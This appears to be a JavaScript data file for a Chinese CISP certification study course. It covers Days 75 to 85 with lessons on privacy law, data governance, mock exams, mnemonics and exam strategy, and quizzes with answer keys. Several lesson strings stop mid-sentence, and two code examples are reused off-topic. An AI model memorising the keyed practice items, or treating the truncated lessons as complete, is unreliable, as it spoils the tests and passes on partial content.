  quiz:[{"id":"q75-1","question":"PIPL数据主体知情同意必须是？","options":["默示同意", "明示、自由、具体、知情", "事后通知", "一次永逸"],"correctIndex":1,"explanation":"PIPL要求明确告知+主动同意。"},{"id":"q75-2","question":"DSAR全称？","options":["Data Security Alert", "数据主体访问请求(Data Subject Access Request)", "Domain System Access", "Data Storage And Review"],"correctIndex":1,"explanation":"DSAR=用户行使权利请求数据。"},{"id":"q75-3","question":"DPO(数据保护官)职责？","options":["写代码", "监督数据保护合规+与监管沟通", "市场营销", "财务管理"],"correctIndex":1,"explanation":"DPO独立监督数据处理合规。"},{"id":"q75-4","question":"数据出境安全评估触发条件？","options":["所有数据", "重要数据+个人信息达一定规模", "非敏感数据", "仅政府数据"],"correctIndex":1,"explanation":"重要数据+PII超量需安全评估。"},{"id":"q75-5","question":"隐私合规审计最好？","options":["仅自查", "独立第三方外部审计", "不做审计", "仅口头确认"],"correctIndex":1,"explanation":"独立第三方审计确保公正性。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[75]||[],
});
allDays.push({
  id:'day-76',day:76,week:11,title:'数据治理体系（业务安全）',
  objectives:['数据治理框架','数据质量管理','元数据管理'],
  content:`# Day 76：数据治理体系
## 一、数据治理框架
\`\`\`
DAMA数据治理车轮：
      ┌──────────────────────────┐
      │     数据架构 · 数据建模    │
      │   ┌──────────────────┐   │
      │   │  数据质量 数据安全  │   │
      │   │        ↕          │   │
      │   │ 元数据  ←→  主数据 │   │
      │   │        ↕          │   │
      │   │ 数据仓库  数据集成  │   │
      │   └──────────────────┘   │
      │  文档管理 · 参考数据管理   │
      └──────────────────────────┘
核心目标：
  使数据成为可信、可用、安全的企业资产
\`\`\`
---
## 二、数据质量管理
\`\`\`
数据质量六维度：
① 完整性 (Completeness)：所有必要数据都存在
② 唯一性 (Uniqueness)：无重复记录
③ 及时性 (Timeliness)：数据反映最新状态
④ 有效性 (Validity)：数据符合定义格式和规则
⑤ 准确性 (Accuracy)：数据正确描述真实世界
⑥ 一致性 (Consistency)：跨系统的数据一致
数据清洗 = 发现并修复数据质量问题
\`\`\`
---
## 三、元数据管理
\`\`\`
三类元数据：
  业务元数据：数据定义、业务术语表、所有权
  技术元数据：表结构、字段类型、ETL映射
  操作元数据：运行日志、访问统计、数据血缘
元数据价值：
  → 数据资产可见性（有什么数据、在哪里）
  → 影响分析（改了A表影响哪些报表）
  → 血缘追踪（这个数据从哪里来的）
\`\`\`
---
## 四、数据血缘与目录
\`\`\`
数据血缘 (Data Lineage)：
  追踪数据从源头到目的地的完整路径
  数据源A ─┐
           ├→ ETL处理 → 数据仓库 → BI报表
  数据源B ─┘
  价值：问题排查 + 变更影响分析 + 合规审计
数据目录 (Data Catalog)：
  企业数据资产的"搜索引擎"
  含：数据位置 + 质量信息 + 所有权 + 术语
\`\`\`
---
| 考点 | 记忆要点 |
|------|---------|
| 数据质量六维 | "完整+唯一+及时+有效+准确+一致" |
| 元数据三类 | "业务+技术+操作" |
| 数据血缘 | "数据来源到目的地的完整路径追踪" |
---
- [ ] 数据治理的核心目标？
- [ ] 数据质量的六个维度？
- [ ] 三类元数据分别是什么？
- [ ] 数据血缘与数据目录的区别？
---
> **下一步**：Day 77 第十一周总结与测验。`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
  quiz:[{"id":"q76-1","question":"DAMA数据治理框架核心域？","options":["仅技术", "数据架构/质量/安全/元数据等11个域", "仅安全", "仅存储"],"correctIndex":1,"explanation":"DAMA-DMBOK=11个知识领域。"},{"id":"q76-2","question":"元数据管理指？","options":["管理用户数据", "管理数据的数据(描述数据的数据)", "删除数据", "加密数据"],"correctIndex":1,"explanation":"元数据=数据的标签/分类/血缘。"},{"id":"q76-3","question":"数据质量核心维度不包括？","options":["准确性", "颜色", "完整性", "一致性"],"correctIndex":1,"explanation":"数据质量=准确/完整/一致/及时/唯一。"},{"id":"q76-4","question":"数据资产管理核心？","options":["随意存储", "数据确权+估值+生命周期管理", "不做管理", "无限期保留"],"correctIndex":1,"explanation":"数据资产=有价、确权、可管。"},{"id":"q76-5","question":"数据血缘(Lineage)追踪什么？","options":["数据量", "数据从源头到消费的全链路流转", "只是时间", "只是来源"],"correctIndex":1,"explanation":"血统=溯源→谁生成了它→经过了哪些变换。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[76]||[],
});
allDays.push({
  id:'day-77',day:77,week:11,title:'十一周总结与测验（业务安全）',
  objectives:['知识地图','核心口诀','模拟测验（8题）'],
  content:`# Day 77：第十一周总结与测验
\`\`\`
Week 11 数据隐私与治理：
  Day 71 — 隐私保护 (PIPL七权 / 数据出境)
  Day 72 — 数据加密 (五层加密 / FDE / TDE / KMS)
  Day 73 — 数据脱敏 (掩码/FPE/SDM/DDM)
  Day 74 — 生命周期 (六阶段 / 分类分级 / 销毁)
  Day 75 — 隐私合规 (知情同意 / DSAR / 审计)
  Day 76 — 数据治理 (六维质量 / 元数据 / 血缘)
\`\`\`
---
\`\`\`
隐私保护： 知情+决定+限制+查阅+更正+删除+可携带 = PIPL七权
数据出境： 评估/认证/标准合同 = 三选一
数据分级： 一般→重要→核心(国家)  公开→内部→机密→绝密(企业)
加密层次： 硬件→块设备→文件系统→数据库→应用层
脱敏算法： 掩码+替换+随机+泛化+哈希+FPE
销毁方式： 覆写(HDD)+加密擦除(SSD)+消磁(磁带)+粉碎(纸)
数据质量： 完整+唯一+及时+有效+准确+一致
\`\`\`
---
**1. PIPL赋予个人的权利中不包括？**
A. 知情权 B. 删除权 C. 知识产权 D. 可携带权
<details><summary>答案</summary>**C** — 知识产权不属于PIPL数据主体权利。</details>
---
**2. TDE（透明数据加密）保护以下哪项？**
A. 网络传输数据 B. 运行中内存数据 C. 磁盘上的数据文件 D. 显示在屏幕上的数据
<details><summary>答案</summary>**C** — TDE保护存储中的数据文件，不保护传输或内存数据。</details>
---
**3. FPE（格式保留加密）的主要价值是什么？**
A. 更安全 B. 加密后保持原数据格式 C. 速度更快 D. 不需要密钥
<details><summary>答案</summary>**B** — FPE加密后仍保持原有格式（如16位卡号）。</details>
---
**4. SSD销毁推荐方式？**
A. 物理粉碎 B. 覆写3次 C. 加密擦除(Crypto-Shredding) D. 水浸
<details><summary>答案</summary>**C** — 加密擦除最适合SSD(或物理粉碎)，覆写不适合SSD的磨损均衡机制。</details>
---
**5-8. 判断题**
**5. 静态脱敏(SDM)适合生产环境实时保护。** ❌ （SDM是离线的，DDM才是实时的）
**6. 数据血缘追踪数据从源头到目的地的路径。** ✅
**7. 企业数据分级公开→内部→机密→绝密中，产品介绍属于内部级。** ❌ （属于公开级）
**8. 有效同意必须是"默认勾选"。** ❌ （必须是主动勾选，禁止默认勾选）
---
## 四、学习进度
\`\`\`
✅ Week 1-11 完成  ███████████████████ 77/84 (92%)
⬜ Week 12 待完成  ░░ 7/84 (Day 78-84)
\`\`\`
---
> **最终冲刺**：Day 78 开始模拟考试周——CISP全面模拟测试！`,
  codeExample:{language:'python',code:'print(\"=== 数据安全与隐私保护 ===\\n\")\n\n# PIPL七权利\nrights = [\"知情权\", \"查阅权\", \"更正权\", \"删除权\", \"限制处理权\", \"可携带权\", \"反对权\"]\nprint(\"PIPL七大权利:\")\nfor i, r in enumerate(rights, 1):\n    print(f\"  {i}. {r}\")\n\n# 数据分类\nlevels = [(\"公开\", \"无限制\"), (\"内部\", \"员工可访问\"), (\"机密\", \"授权访问\"), (\"绝密\", \"严格限制\")]\nprint(\"\\n数据分类分级:\")\nfor name, desc in levels:\n    print(f\"  [{name}] {desc}\")\n\n# 加密四层\nlayers = [\"应用层加密\", \"数据库加密(TDE)\", \"文件系统加密\", \"全盘加密(FDE)\"]\nprint(\"\\n加密四层架构:\")\nfor i, l in enumerate(layers, 1):\n    print(f\"  L{i}: {l}\")',description:'业务安全与数据隐私'},
  quiz:[{"id":"q77-1","question":"等保三级要求多久测评？","options":["无需", "每两年", "每年至少一次", "每五年"],"correctIndex":2,"explanation":"等保三级=每年至少一次等级测评。"},{"id":"q77-2","question":"PDCERF中C代表什么？","options":["计算", "遏制(Contain-防止损害扩大)", "检查", "清理"],"correctIndex":1,"explanation":"Containment=止血/隔离。"},{"id":"q77-3","question":"GDPR域外管辖权含义？","options":["仅管辖欧盟", "管辖任何处理欧盟公民数据的组织,无论在哪", "仅大企业", "仅科技公司"],"correctIndex":1,"explanation":"长臂管辖=处理EU公民数据即受管辖。"},{"id":"q77-4","question":"审计日志管理职责分离?","options":["管理员可删改日志", "管理员不可删改日志,审计员管理日志", "所有人可改", "云端存储"],"correctIndex":1,"explanation":"管理员可能清除自己违规操作的痕迹。"},{"id":"q77-5","question":"PIPL七权利不包括？","options":["知情权", "查阅权", "加速处理权", "可携带权"],"correctIndex":2,"explanation":"七权利=知/查/改/删/限/带/反。加速处理非法定。"}],
  recommendedTools:weekToolMap[11]?.tools||[],labEnvironments:weekToolMap[11]?.labs||[],expertNotes:dayExpertNotes[77]||[],
});

// Day 78: 模拟考试一（全真模拟测试）
allDays.push({
  id: 'day-78', day: 78, week: 12, title: '模拟考试一（全真模拟测试）',
  objectives: ["完成CISP全真模拟考试一(100题)", "检验全部11个知识域掌握程度", "查漏补缺定位薄弱点"],
  content: '## 第一部分：信息安全基础（第1-10题）\n\n**1. 信息安全的三要素CIA分别指什么？**\n- A. 保密性、完整性、可用性\n- B. 认证性、完整性、可用性\n- C. 机密性、完整性、认证性\n- D. 保密性、可追溯性、可用性\n\n<details>\n<summary>点击查看答案</summary>\n\n**正确答案：A**\n\nCIA三要素：Confidentiality（机密性）、Integrity（完整性）、Availability（可用性）。这是信息安全最基本的概念，必须牢记。\n</details>\n\n**2. 以下哪项不属于信息安全的属性？**\n- A. 机密性\n- B. 完整性\n- C. 不可否认性\n- D. 可扩展性\n\n<details>\n<summary>点击查看答案</summary>\n\n**正确答案：D**\n\n信息安全的经典属性包括：机密性、完整性、可用性、认证性、不可否认性（可追溯性）。可扩展性属于系统设计属性，非安全属性。\n</details>\n\n**3. "纵深防御"（Defense in Dep',
  codeExample: {
    language: 'python',
    code: `print("=== CISP模拟考试一 ===\n")
print("覆盖11大知识域: CIA/法律/访问控制/应急/攻防/密码/网络/应用/物理/风险/数据")
print("重点: 等保五级、BLP规则、AES参数、OWASP Top10、法律法规数字")`,
    description: 'Day 78 模拟考试一：全真综合自测'
  },
  quiz: [
    { id: 'q78-1', question: 'CIA三要素中C代表什么?', options: ["Confidentiality(机密性)", "Confidence(信心)", "Certificate(证书)", "Control(控制)"], correctIndex: 0, explanation: 'C=Confidentiality机密性,非Confidence。' },
    { id: 'q78-2', question: '等保制度将信息系统分为几个等级?', options: ["3个", "4个", "5个", "6个"], correctIndex: 2, explanation: '等保五级:自主→审计→标记→结构化→验证。' },
    { id: 'q78-3', question: '网安法要求网络日志留存不少于?', options: ["3个月", "6个月", "12个月", "24个月"], correctIndex: 1, explanation: '网络安全法第21条:不少于六个月。' },
    { id: 'q78-4', question: 'BLP模型的核心规则是?', options: ["不上读、不下写", "不下读、不上写", "可上读、可下写", "随意读写"], correctIndex: 0, explanation: 'BLP机密性:不上读不下写。Biba正好相反。' },
    { id: 'q78-5', question: '数字签名不能提供以下哪种?', options: ["完整性", "认证性", "机密性", "不可否认性"], correctIndex: 2, explanation: '签名提供完整+认证+不可否认,不含机密性。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[78] || [],
});

// Day 79: 模拟考试二（第二套全真模拟题）
allDays.push({
  id: 'day-79', day: 79, week: 12, title: '模拟考试二（第二套全真模拟题）',
  objectives: ["完成CISP全真模拟考试二(100题)", "侧重场景应用和综合分析能力", "对比两套试卷定位薄弱知识域"],
  content: '## 第一部分：信息安全基础（第1-10题）\n\n**1. 某银行核心系统遭到攻击后无法对外提供服务，这直接损害了信息安全的哪一个属性？**\n- A. 机密性\n- B. 完整性\n- C. 可用性\n- D. 不可否认性\n\n<details>\n<summary>点击查看答案</summary>\n\n**正确答案：C**\n\n系统无法提供服务直接违反了可用性（Availability）原则。可用性要求授权用户在需要时能够及时访问信息和系统。\n</details>\n\n**2. 某公司数据库管理员修改了用户存款金额记录，这种行为破坏了信息的？**\n- A. 机密性\n- B. 完整性\n- C. 可用性\n- D. 可靠性\n\n<details>\n<summary>点击查看答案</summary>\n\n**正确答案：B**\n\n篡改数据破坏了信息的完整性（Integrity），即确保信息不被非授权修改或破坏。注意这里是篡改记录本身，而非泄漏机密。\n</details>\n\n**3. 以下关于信息安全管理中"自上而下"推进策略的叙述，哪一个最准确？**\n-',
  codeExample: {
    language: 'python',
    code: `print("=== CISP模拟考试二 ===\n")
print("侧重场景题: 给定具体情境,判断最佳安全措施")
print("重点: BLP/Biba对比、CSRF/SSRF区分、TLS1.3改进、SOAR/SIEM关系")`,
    description: 'Day 79 模拟考试二：场景应用分析'
  },
  quiz: [
    { id: 'q79-1', question: 'TLS 1.3完整握手需要几个RTT?', options: ["0-RTT", "1-RTT", "2-RTT", "3-RTT"], correctIndex: 1, explanation: 'TLS1.3=1-RTT(TLS1.2=2-RTT)。0-RTT仅快速重连。' },
    { id: 'q79-2', question: 'CSRF攻击利用的是什么?', options: ["服务器漏洞", "用户已登录的认证状态", "网络漏洞", "操作系统漏洞"], correctIndex: 1, explanation: 'CSRF借用用户已登录的Cookie发起请求。' },
    { id: 'q79-3', question: 'WPA3相比WPA2最大安全改进?', options: ["更长密码", "SAE替代PSK四次握手", "更多设备", "更快速度"], correctIndex: 1, explanation: 'WPA3引入SAE,可抵抗离线字典攻击。' },
    { id: 'q79-4', question: 'SOAR与SIEM的关系是?', options: ["无关", "SOAR=SIEM+编排+自动化+响应", "SIEM包含SOAR", "SOAR替代SIEM"], correctIndex: 1, explanation: 'SOAR将告警→分析→响应自动化串联。' },
    { id: 'q79-5', question: 'SOC与NOC的主要区别?', options: ["SOC管安全,NOC管网络", "完全相同", "SOC是NOC一部分", "没有SOC只有NOC"], correctIndex: 0, explanation: 'SOC=安全运营,NOC=网络运营。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[79] || [],
});

// Day 80: 错题复习（常见陷阱与易错点精讲）
allDays.push({
  id: 'day-80', day: 80, week: 12, title: '错题复习（常见陷阱与易错点精讲）',
  objectives: ["系统梳理28个高频易错点", "掌握核心概念对比辨析", "建立个人错题本"],
  content: '## 一、信息安全基础易混概念\n\n### 🔴 易错点1：CIA三要素的英文全称\n\n```\n❌ 常犯错误：\nC = Confidence（信心）       → 错误！\nC = Confidentiality（机密性） → 正确！\n\n❌ 常犯错误：\n将"可用性"理解为可靠性（Reliability）\n可用性 = Availability → 授权用户在需要时可以访问\n可靠性 = 系统持续正常运行的属性\n```\n\n**记忆法**：CIA不是美国中央情报局，是"**C**onfidentiality **I**ntegrity **A**vailability"\n\n---\n\n### 🔴 易错点2：威胁 vs 脆弱性 vs 风险\n\n| 概念 | 定义 | 例句 |\n|------|------|------|\n| 威胁（Threat） | 可能造成损害的潜在因素 | 黑客、地震、管理员误操作 |\n| 脆弱性（Vulnerability） | 系统/控制手段中的弱点 | 未打补丁、弱密码、开放端口 |\n| 风险（Risk） | 威胁利用脆弱性造成',
  codeExample: {
    language: 'python',
    code: `print("=== CISP高频易错点 ===\n")
mistakes = [
    "CIA中C=Confidentiality(不是Confidence!)",
    "BLP:不上读不下写(机密) | Biba:不下读不上写(完整)",
    "签名≠加密: 签名不含机密性!",
    "AES分组固定128位(256是密钥长度!)",
    "ECB唯一不需要IV(也最不安全)",
    "AH不加密 | ESP加密",
    "TLS 1.3:1-RTT | NIST:4阶段(不是6!)",
    "OWASP 2021 No.1:失效访问控制(不是SQL注入)",
    "CVSS:0.0-10.0 | ARO是次/年不是%",
    "风险处置:规避/转移/缓解/接受(没有忽略!)",
]
for m in mistakes: print(f"  • {m}")`,
    description: 'Day 80 错题复习：28个易错点速查'
  },
  quiz: [
    { id: 'q80-1', question: 'BLP模型保护的是什么?', options: ["机密性", "完整性", "可用性", "不可否认性"], correctIndex: 0, explanation: 'BLP=机密性(不上读不下写),Biba=完整性。' },
    { id: 'q80-2', question: 'AES分组长度是多少?', options: ["64位", "128位", "256位", "可变"], correctIndex: 1, explanation: 'AES分组固定128!256是密钥长度。经典陷阱!。' },
    { id: 'q80-3', question: '哪种不是合法风险处置策略?', options: ["规避", "转移", "忽略", "接受"], correctIndex: 2, explanation: '四种合法:规避/转移/缓解/接受。忽略不是!。' },
    { id: 'q80-4', question: 'NIST应急响应有几个阶段?', options: ["3个", "4个", "5个", "6个"], correctIndex: 1, explanation: 'NIST=4阶段。PICERL=6阶段。常混淆!。' },
    { id: 'q80-5', question: '哪种加密模式不需要IV?', options: ["CBC", "CTR", "ECB", "GCM"], correctIndex: 2, explanation: 'ECB唯一不需要IV,也最不安全。GCM最佳。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[80] || [],
});

// Day 81: 重点串讲（CISP知识体系总梳理）
allDays.push({
  id: 'day-81', day: 81, week: 12, title: '重点串讲（CISP知识体系总梳理）',
  objectives: ["串联11大知识域形成完整体系", "理解各知识域关联", "建立CISP知识全景图"],
  content: '## 第一板块：信息安全基础——整个学科的地基\n\n### 核心知识骨架\n\n```\nCIA三要素 ──► 安全属性体系 ──► 纵深防御策略 ──► ISMS管理体系\n│                │                │                │\n▼                ▼                ▼                ▼\n机密性(C)     认证性(Auth)      多层防护        ISO 27001\n完整性(I)     不可否认性(Non-rep) 最小权限         PDCA循环\n可用性(A)     可追溯性(Acct)     职责分离         安全策略层次\n```\n\n### 串联各知识域\n\n- **CIA** → 密码学保护C（加密）+ I（哈希/签名）+ 访问控制保护C（最小权限）\n- **纵深防御** → 网络分层（防火墙+IDS+VLAN）+ 应用分层（WAF+SDL）+ 物理分层\n- **PDCA** → 应急响应（事先准备/事中检测/事后改进）也是P',
  codeExample: {
    language: 'python',
    code: `print("=== CISP 11大知识域全景 ===\n")
domains = {
    "信息安全基础": "CIA/纵深防御/ISMS/PDCA",
    "法律法规": "网安法/等保/个保法/数安法/CII",
    "访问控制": "BLP/Biba/DAC/MAC/RBAC/零信任/OAuth",
    "安全运维": "PICERL/SIEM/RTO/RPO/BCP/DRP",
    "漏洞攻防": "CVSS/CVE/OWASP/SQLi/XSS/CSRF/APT",
    "密码学": "AES/RSA/ECC/SHA/签名/PKI/DH",
    "网络安全": "ARP/DNS/BGP/防火墙/IDS/IPS/VPN",
    "应用安全": "SDL/SAST/DAST/STRIDE/DevSecOps",
    "物理安全": "TIA-942/VESDA/FM200/3-2-1",
    "风险管理": "SLE=AV×EF/ALE/SLE×ARO/NIST RMF",
    "数据隐私": "GDPR/PIPL/脱敏/DLP/同态加密",
}
for k,v in domains.items(): print(f"  [{k}] → {v}")`,
    description: 'Day 81 知识体系串联'
  },
  quiz: [
    { id: 'q81-1', question: 'PICERL第一步是什么?', options: ["识别", "准备", "遏制", "恢复"], correctIndex: 1, explanation: 'P=准备(Preparation),然后是I识别→C遏制→E根除→R恢复→L总结。' },
    { id: 'q81-2', question: 'SLE的计算公式?', options: ["SLE=AV×EF", "SLE=ALE÷ARO", "SLE=ARO×ALE", "SLE=AV+EF"], correctIndex: 0, explanation: 'SLE=资产价值×暴露因子。ALE=SLE×ARO。' },
    { id: 'q81-3', question: 'STRIDE的S代表什么?', options: ["Spoofing(假冒)", "Scanning(扫描)", "Sniffing(嗅探)", "Spam(垃圾)"], correctIndex: 0, explanation: 'STRIDE:Spoofing/Tampering/Repudiation/InfoDisclosure/DoS/Elevation。' },
    { id: 'q81-4', question: '数据生命周期的最后阶段?', options: ["使用", "归档", "销毁", "共享"], correctIndex: 2, explanation: '创建→存储→使用→共享→归档→销毁。销毁需不可恢复。' },
    { id: 'q81-5', question: 'IPsec中加密协议是?', options: ["AH", "ESP", "IKE", "ISAKMP"], correctIndex: 1, explanation: 'ESP=加密+可选认证。AH=只认证不加密。IKE=密钥协商。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[81] || [],
});

// Day 82: 考前冲刺（高频考点速记与口诀）
allDays.push({
  id: 'day-82', day: 82, week: 12, title: '考前冲刺（高频考点速记与口诀）',
  objectives: ["背诵30条考前冲刺口诀", "快速过一遍高频考点参数", "考前最后的知识梳理"],
  content: '## 一、信息安全基础高频考点 ⭐⭐⭐⭐\n\n### 必背三句话\n\n```\n1. CIA三要素：机密性(Confidentiality)、完整性(Integrity)、可用性(Availability)\n口诀：CIA不是情报局，C是加密I是签名A是备份\n\n2. 纵深防御：多层防护，没有单一安全控制能防御所有威胁\n口诀：城门→城墙→护城河→卫兵，层层设防\n\n3. 最小权限：完成工作所需的最小权限集合\n口诀：够用就好，不多不少\n```\n\n### ISO 27001 PDCA速记\n\n```\nP - Plan（策划） → "定规矩"：范围、风险评估、安全策略\nD - Do（实施）   → "按规矩做"：实施控制措施、培训\nC - Check（检查）→ "查效果"：内部审计、管理评审、监控\nA - Act（改进）  → "改不足"：纠正措施、预防措施、持续改进\n\n口诀：皮蛋叉烧（PDCA）→ 定做查改\n```\n\n### 安全控制分类\n\n```\n管理控制 → "人管"：策略、流程、培训\n技术控制 → "技防"：防火墙、加密、IDS\n物理控',
  codeExample: {
    language: 'python',
    code: `print("=== CISP 冲刺口诀30条 ===\n")
s = [
"1.CIA→机密完整可用  2.纵深防御→多层防护",
"3.最小权限→够用就好  4.PDCA→定做查改",
"5.等保→五级三标记  6.网安法→日志六月留",
"7.BLP→上不读下不写  8.Biba→下不读上不写",
"9.AES分组永远是128  10.ECB唯一不需要IV",
"11.签名不加密  12.TLS1.3→1-RTT",
"13.OWASP2021No.1→失效访问控制",
"14.SLE=AV×EF  ALE=SLE×ARO",
"15.3-2-1→3副本2介质1异地",
]
for x in s: print(f"  {x}")`,
    description: 'Day 82 考前冲刺口诀速记'
  },
  quiz: [
    { id: 'q82-1', question: 'CIA中I代表什么?', options: ["完整性Integrity", "可用性Availability", "机密性Confidentiality", "不可否认"], correctIndex: 0, explanation: 'I=Integrity(完整性)。C=Confidentiality,A=Availability。' },
    { id: 'q82-2', question: '等保三级测评频率?', options: ["每半年", "每年至少一次", "每两年", "无要求"], correctIndex: 1, explanation: '三级每年至少一次。四级每半年。二级建议每两年。' },
    { id: 'q82-3', question: 'Kerberos使用什么机制?', options: ["JWT Token", "TGT票据授予票据", "API Key", "Session Cookie"], correctIndex: 1, explanation: 'Kerberos:TGT→ST→访问服务。门票系统。' },
    { id: 'q82-4', question: 'TIA-942几个等级?', options: ["3个", "4个", "5个", "6个"], correctIndex: 1, explanation: 'TIA-942四级(Tier I-IV)。等保是五级,别混淆!。' },
    { id: 'q82-5', question: '3-2-1备份中1指什么?', options: ["每天一次", "至少1份离线/异地", "1种介质", "1份数据"], correctIndex: 1, explanation: '3副本+2介质+1异地。防勒索软件关键!。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[82] || [],
});

// Day 83: 考试技巧（答题策略与时间管理）
allDays.push({
  id: 'day-83', day: 83, week: 12, title: '考试技巧（答题策略与时间管理）',
  objectives: ["掌握CISP考试答题策略", "学会时间管理与审题技巧", "了解常见陷阱题应对方法"],
  content: '## 一、CISP考试基本情况和规则\n\n### 考试信息速览\n\n```\n考试形式：    闭卷，笔试/机考\n题目类型：    单选题（100道）\n考试时间：    120分钟（2小时）\n满分/合格：   100分 / 60分合格\n题型分布：    全部为单选题（四选一）\n答题卡填写：  使用2B铅笔填涂（笔试）/ 机考系统点击选择\n```\n\n### 时间分配建议\n\n```\n题型策略              时间      平均每题\n──────────────────────────────────────\n第一遍：全部作答      70分钟    约42秒/题\n第二遍：检查标记题    20分钟    重点攻克疑难\n第三遍：全面检查      15分钟    防漏填、看串行\n填涂答题卡/交卷前确认  15分钟\n──────────────────────────────────────\n总计                 120分钟\n```\n\n> **核心原则**：不要在一道题上纠结超过2分钟！先选一个合理答案，标记后继续，回',
  codeExample: {
    language: 'python',
    code: `print("=== CISP考试策略 ===\n")
print("三阶段时间管理:")
print("  0-70min: 全部作答(42秒/题)")
print("  70-90min: 攻克标记难题")
print("  90-120min: 全面检查+防串行\n")
print("审题三步法:")
print("  1.先读最后一句话(真正问题)")
print("  2.圈出否定词(不属于/错误/除了)")
print("  3.带问题回题干提取关键信息\n")
print("答题: 先预设答案→排除法→对比择优")
print("改答案: 有确切理由才改,不要瞎改!")`,
    description: 'Day 83 考试技巧与时间管理'
  },
  quiz: [
    { id: 'q83-1', question: 'CISP满分和合格线?', options: ["100/60", "100/70", "150/90", "200/120"], correctIndex: 0, explanation: '100道单选,满分100,60分合格。' },
    { id: 'q83-2', question: '遇到不属于/错误等否定词?', options: ["忽略", "特别标注,防惯性思维选反", "跳过", "随便选"], correctIndex: 1, explanation: '否定型题目最容易失分!必须特别标注。' },
    { id: 'q83-3', question: '2分钟没做出来某题?', options: ["死磕", "标记跳过,先做后面的", "随便选C", "放弃"], correctIndex: 1, explanation: '先标记跳过,回头再战。每题至少选个答案。' },
    { id: 'q83-4', question: 'IDS和IPS区别?', options: ["IDS串联", "IDS旁路只检测,IPS串联可阻断", "都串联", "都旁路"], correctIndex: 1, explanation: 'IDS=眼睛(旁路),IPS=手(串联阻断)。' },
    { id: 'q83-5', question: '最佳答题策略?', options: ["乱蒙", "排除法:去明显错误→对比择优", "选最长", "选C"], correctIndex: 1, explanation: '排除法是最有效的策略!。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[83] || [],
});

// Day 84: 结业测试（综合测评与毕业）
allDays.push({
  id: 'day-84', day: 84, week: 12, title: '结业测试（综合测评与毕业）',
  objectives: ["完成50道结业综合测试题", "检验84天系统学习成果", "为CISP正式考试做好准备"],
  content: '## 综合测评试题（第1-50题）\n\n### 信息安全基础（1-5题）\n\n**1. 某公司的客户数据库被黑客入侵并被公开，客户的手机号、身份证号全部暴露。按照CIA三要素，这主要损害了哪个属性？**\n\nA. 机密性（Confidentiality）\nB. 完整性（Integrity）\nC. 可用性（Availability）\nD. 不可否认性（Non-repudiation）\n\n<details>\n<summary>答案与解析</summary>\n\n**A** —— 数据被"暴露/公开"是机密性遭到破坏。完整性是指数据被篡改，可用性是指服务不可访问。\n\n</details>\n\n**2. 纵深防御策略要求信息安全控制覆盖多个层面。以下哪项组合最完整地体现了纵深防御？**\n\nA. 防火墙 + 杀毒软件\nB. 管理控制 + 技术控制 + 物理控制\nC. 仅采购最贵的安全产品\nD. 只做边界防护\n\n<details>\n<summary>答案与解析</summary>\n\n**B** —— 纵深防御从管理、技术、物理三个维度同时防护。A只有技',
  codeExample: {
    language: 'python',
    code: `print("=== CISP 84天毕业测试 ===\n")
print("必会公式: SLE=AV×EF | ALE=SLE×ARO")
print("必会对比: BLPvsBiba | AHvsESP | SASTvsDAST")
print("必会参数: AES分组128 | SHA256输出256 | CVSS0-10")
print("必会数字: 网安日志6月 | 等保三级年测 | TLS1.3 1-RTT")
print("\n84天,从CIA三要素到数据隐私保护")
print("你已经准备好了! 准CISP持证人!")`,
    description: 'Day 84 结业测试'
  },
  quiz: [
    { id: 'q84-1', question: '资产200万,损失80%,年发生率0.2,ALE=?', options: ["16万", "32万", "40万", "160万"], correctIndex: 1, explanation: 'SLE=200×80%=160万; ALE=160×0.2=32万。' },
    { id: 'q84-2', question: 'OWASP 2021 No.1?', options: ["SQL注入", "失效访问控制", "XSS", "安全配置错误"], correctIndex: 1, explanation: '2021版No.1=Broken Access Control。' },
    { id: 'q84-3', question: '属于敏感个人信息?', options: ["工作邮箱", "生物识别(指纹/人脸)", "公司名", "职位"], correctIndex: 1, explanation: '敏感:生物识别/医疗/金融/行踪/14岁以下/宗教。' },
    { id: 'q84-4', question: '防御Clickjacking?', options: ["SQL参数化", "X-Frame-Options:DENY", "输入过滤", "HTTPS"], correctIndex: 1, explanation: 'X-Frame-Options或CSP frame-ancestors阻止嵌套。' },
    { id: 'q84-5', question: 'SAST特征是?', options: ["测试运行应用", "不运行,分析源代码", "模拟攻击", "只能发现网络漏洞"], correctIndex: 1, explanation: 'SAST白盒静态分析源码。DAST黑盒测试运行应用。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[84] || [],
});


// ========== Days 85-90: 考前冲刺复习 ==========
// Day 85: 信息安全基础与法律法规专项复习
allDays.push({
  id: 'day-85', day: 85, week: 12, title: '信息安全基础与法律法规专项复习',
